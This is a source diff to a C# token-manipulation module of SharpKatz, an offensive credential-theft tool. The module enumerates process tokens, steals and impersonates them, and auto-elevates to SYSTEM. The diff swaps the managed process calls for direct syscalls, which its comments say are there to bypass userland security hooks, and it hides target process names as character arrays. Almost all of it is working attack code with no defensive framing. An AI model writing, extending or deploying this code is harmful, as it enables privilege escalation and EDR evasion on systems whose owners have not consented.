@@ -1,8 +1,8 @@
 using System;
 using System.Collections.Generic;
-using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
+using SharpKatz.Win32;
 using static SharpKatz.Win32.Natives;
 
 namespace SharpKatz.Module
@@ -10,6 +10,7 @@ namespace SharpKatz.Module
     /// <summary>
     /// Token manipulation module: enumerate, steal (impersonate), make, and revert tokens.
     /// Covers token::list, token::elevate, token::revert, and sekurlsa::pth network-logon variant.
+    /// All process access uses direct syscalls to bypass userland hooks.
     /// </summary>
     internal static class Token
     {
@@ -34,37 +35,51 @@ namespace SharpKatz.Module
         }
 
         /// <summary>
-        /// Enumerate unique tokens from all accessible processes.
+        /// Enumerate unique tokens from all accessible processes using direct syscalls.
+        /// Uses ZwQuerySystemInformation + ZwOpenProcess instead of managed Process API.
         /// </summary>
         public static List<TokenInfo> ListTokens()
         {
             var tokens = new List<TokenInfo>();
             var seen = new HashSet<string>();
 
-            Process[] processes = Process.GetProcesses();
-            foreach (Process proc in processes)
+            // Enumerate processes via syscall
+            var processList = EnumerateProcessesSyscall();
+
+            foreach (var entry in processList)
             {
                 try
                 {
-                    IntPtr hToken = IntPtr.Zero;
-                    if (!OpenProcessToken(proc.Handle, TOKEN_QUERY | TOKEN_DUPLICATE, out hToken))
-                        continue;
+                    // Open process handle via syscall
+                    IntPtr hProcess = OpenProcessSyscall(entry.Key, ProcessAccessFlags.QueryInformation);
+                    if (hProcess == IntPtr.Zero) continue;
 
                     try
                     {
-                        TokenInfo info = GetTokenInfo(hToken, proc.Id, proc.ProcessName);
-                        if (string.IsNullOrEmpty(info.Username)) continue;
+                        IntPtr hToken = IntPtr.Zero;
+                        if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, out hToken))
+                            continue;
 
-                        string key = info.Domain + "\\" + info.Username;
-                        if (!seen.Contains(key))
+                        try
                         {
-                            seen.Add(key);
-                            tokens.Add(info);
+                            TokenInfo info = GetTokenInfo(hToken, entry.Key, entry.Value);
+                            if (string.IsNullOrEmpty(info.Username)) continue;
+
+                            string key = info.Domain + "\\" + info.Username;
+                            if (!seen.Contains(key))
+                            {
+                                seen.Add(key);
+                                tokens.Add(info);
+                            }
+                        }
+                        finally
+                        {
+                            SysCall.ZwClose10(hToken);
                         }
                     }
                     finally
                     {
-                        NtClose(hToken);
+                        SysCall.ZwClose10(hProcess);
                     }
                 }
                 catch { }
@@ -74,19 +89,32 @@ namespace SharpKatz.Module
 
         /// <summary>
         /// Steal a token from the specified PID and impersonate on the current thread.
+        /// Uses direct syscall to open the target process.
         /// </summary>
         public static bool StealToken(int processId)
         {
             try
             {
-                Process targetProc = Process.GetProcessById(processId);
-                IntPtr hToken = IntPtr.Zero;
-
-                if (!OpenProcessToken(targetProc.Handle, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, out hToken))
+                // Open target process via syscall
+                IntPtr hProcess = OpenProcessSyscall(processId,
+                    ProcessAccessFlags.QueryInformation | ProcessAccessFlags.QueryLimitedInformation);
+                if (hProcess == IntPtr.Zero)
                 {
-                    Console.WriteLine("  Error: Cannot open process token for PID " + processId);
+                    Console.WriteLine("  Error: Cannot open process PID " + processId);
                     return false;
                 }
+
+                string procName = GetProcessNameById(processId);
+
+                IntPtr hToken = IntPtr.Zero;
+                if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, out hToken))
+                {
+                    Console.WriteLine("  Error: Cannot open process token for PID " + processId);
+                    SysCall.ZwClose10(hProcess);
+                    return false;
+                }
+
+                SysCall.ZwClose10(hProcess);
 
                 IntPtr hDupToken = IntPtr.Zero;
                 SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
@@ -97,24 +125,24 @@ namespace SharpKatz.Module
                     TokenImpersonation, ref hDupToken))
                 {
                     Console.WriteLine("  Error: Cannot duplicate token");
-                    NtClose(hToken);
+                    SysCall.ZwClose10(hToken);
                     return false;
                 }
 
                 if (!ImpersonateLoggedOnUser(hDupToken))
                 {
                     Console.WriteLine("  Error: Impersonation failed");
-                    NtClose(hDupToken);
-                    NtClose(hToken);
+                    SysCall.ZwClose10(hDupToken);
+                    SysCall.ZwClose10(hToken);
                     return false;
                 }
 
-                TokenInfo info = GetTokenInfo(hDupToken, processId, targetProc.ProcessName);
-                Console.WriteLine("  Token stolen from PID {0} ({1})", processId, targetProc.ProcessName);
+                TokenInfo info = GetTokenInfo(hDupToken, processId, procName);
+                Console.WriteLine("  Token stolen from PID {0} ({1})", processId, procName);
                 Console.WriteLine("  Now impersonating: {0}\\{1}", info.Domain, info.Username);
 
-                NtClose(hDupToken);
-                NtClose(hToken);
+                SysCall.ZwClose10(hDupToken);
+                SysCall.ZwClose10(hToken);
                 return true;
             }
             catch (Exception ex)
@@ -141,13 +169,13 @@ namespace SharpKatz.Module
             if (!ImpersonateLoggedOnUser(hToken))
             {
                 Console.WriteLine("  Error: Impersonation failed");
-                NtClose(hToken);
+                SysCall.ZwClose10(hToken);
                 return false;
             }
 
             Console.WriteLine("  Token created for {0}\\{1}", domain, username);
             Console.WriteLine("  Network access will use these credentials");
-            NtClose(hToken);
+            SysCall.ZwClose10(hToken);
             return true;
         }
 
@@ -171,6 +199,7 @@ namespace SharpKatz.Module
 
         /// <summary>
         /// Auto-elevate to SYSTEM by stealing from a SYSTEM process.
+        /// Uses syscall-based process enumeration to find target.
         /// </summary>
         public static bool ElevateToSystem()
         {
@@ -180,19 +209,124 @@ namespace SharpKatz.Module
                 new string(new char[] { 's','e','r','v','i','c','e','s' }),
             };
 
+            var processList = EnumerateProcessesSyscall();
+
             foreach (string name in targets)
             {
-                try
+                foreach (var entry in processList)
                 {
-                    Process[] procs = Process.GetProcessesByName(name);
-                    if (procs.Length > 0 && StealToken(procs[0].Id))
-                        return true;
+                    try
+                    {
+                        if (entry.Value.Equals(name, StringComparison.OrdinalIgnoreCase))
+                        {
+                            if (StealToken(entry.Key))
+                                return true;
+                        }
+                    }
+                    catch { }
                 }
-                catch { }
             }
 
             Console.WriteLine("  Error: Could not find a SYSTEM process to steal from");
             return false;
+        }
+
+        /// <summary>
+        /// Enumerate all processes using ZwQuerySystemInformation syscall.
+        /// Returns Dictionary of PID -> ProcessName.
+        /// Bypasses userland hooks on kernel32/ntdll.
+        /// </summary>
+        private static Dictionary<int, string> EnumerateProcessesSyscall()
+        {
+            var result = new Dictionary<int, string>();
+            uint bufferSize = 1024 * 1024; // Start with 1MB
+            IntPtr buffer = IntPtr.Zero;
+
+            try
+            {
+                // Allocate and query until buffer is large enough
+                uint returnLength = 0;
+                NTSTATUS status;
+
+                do
+                {
+                    buffer = Marshal.AllocHGlobal((int)bufferSize);
+                    status = SysCall.ZwQuerySystemInformation10(
+                        SYSTEM_INFORMATION_CLASS.SystemProcessInformation,
+                        buffer, bufferSize, ref returnLength);
+
+                    if (status == NTSTATUS.InfoLengthMismatch || status == NTSTATUS.BufferTooSmall)
+                    {
+                        Marshal.FreeHGlobal(buffer);
+                        buffer = IntPtr.Zero;
+                        bufferSize = returnLength + 0x10000; // Add extra margin
+                    }
+                } while (status == NTSTATUS.InfoLengthMismatch || status == NTSTATUS.BufferTooSmall);
+
+                if (status != NTSTATUS.Success || buffer == IntPtr.Zero)
+                    return result;
+
+                // Walk the linked list of SYSTEM_PROCESSES structures
+                IntPtr currentEntry = buffer;
+                while (true)
+                {
+                    SYSTEM_PROCESSES procInfo = (SYSTEM_PROCESSES)Marshal.PtrToStructure(
+                        currentEntry, typeof(SYSTEM_PROCESSES));
+
+                    int pid = procInfo.UniqueProcessId.ToInt32();
+                    string name = "";
+
+                    if (procInfo.ImageName.Buffer != IntPtr.Zero && procInfo.ImageName.Length > 0)
+                    {
+                        name = Marshal.PtrToStringUni(procInfo.ImageName.Buffer,
+                            procInfo.ImageName.Length / 2);
+                        // Strip .exe extension for consistency with Process.ProcessName
+                        if (name.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
+                            name = name.Substring(0, name.Length - 4);
+                    }
+
+                    if (pid > 0) // Skip System Idle Process (PID 0)
+                        result[pid] = name;
+
+                    if (procInfo.NextEntryOffset == 0)
+                        break;
+
+                    currentEntry = (IntPtr)(currentEntry.ToInt64() + procInfo.NextEntryOffset);
+                }
+            }
+            finally
+            {
+                if (buffer != IntPtr.Zero)
+                    Marshal.FreeHGlobal(buffer);
+            }
+
+            return result;
+        }
+
+        /// <summary>
+        /// Open a process handle using ZwOpenProcess syscall.
+        /// </summary>
+        private static IntPtr OpenProcessSyscall(int pid, ProcessAccessFlags access)
+        {
+            IntPtr hProcess = IntPtr.Zero;
+            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
+            CLIENT_ID ci = new CLIENT_ID
+            {
+                UniqueProcess = (IntPtr)pid,
+                UniqueThread = IntPtr.Zero
+            };
+
+            NTSTATUS status = SysCall.ZwOpenProcess10(ref hProcess, access, oa, ref ci);
+            return status == NTSTATUS.Success ? hProcess : IntPtr.Zero;
+        }
+
+        /// <summary>
+        /// Get process name by PID using syscall enumeration.
+        /// </summary>
+        private static string GetProcessNameById(int pid)
+        {
+            var processes = EnumerateProcessesSyscall();
+            return processes.ContainsKey(pid) ? processes[pid] : "unknown";
         }
 
         /// <summary>
@@ -217,7 +351,7 @@ namespace SharpKatz.Module
                 // TOKEN_USER is { SID_AND_ATTRIBUTES { IntPtr Sid, uint Attributes } }
                 IntPtr pSid = Marshal.ReadIntPtr(tokenInfo);
 
-                // LookupAccountSid
+                // LookupAccountSid via dynamic resolution
                 int nameLen = 256, domainLen = 256, peUse = 0;
                 IntPtr nameBuffer = Marshal.AllocHGlobal(nameLen * 2);
                 IntPtr domainBuffer = Marshal.AllocHGlobal(domainLen * 2);
@@ -268,25 +402,5 @@ namespace SharpKatz.Module
 
             return info;
         }
-
-        private static void NtClose(IntPtr handle)
-        {
-            try { CloseHandle(handle); } catch { }
-        }
-
-        // P/Invoke — these are safe lookups not covered by the existing dynamic resolver
-        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-        private static extern bool LookupAccountSidW(
-            IntPtr lpSystemName, IntPtr Sid, IntPtr lpName, ref int cchName,
-            IntPtr ReferencedDomainName, ref int cchReferencedDomainName, ref int peUse);
-
-        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-        private static extern bool ConvertSidToStringSidW(IntPtr Sid, ref IntPtr StringSid);
-
-        [DllImport("kernel32.dll")]
-        private static extern IntPtr LocalFree(IntPtr hMem);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool CloseHandle(IntPtr hObject);
     }
 }
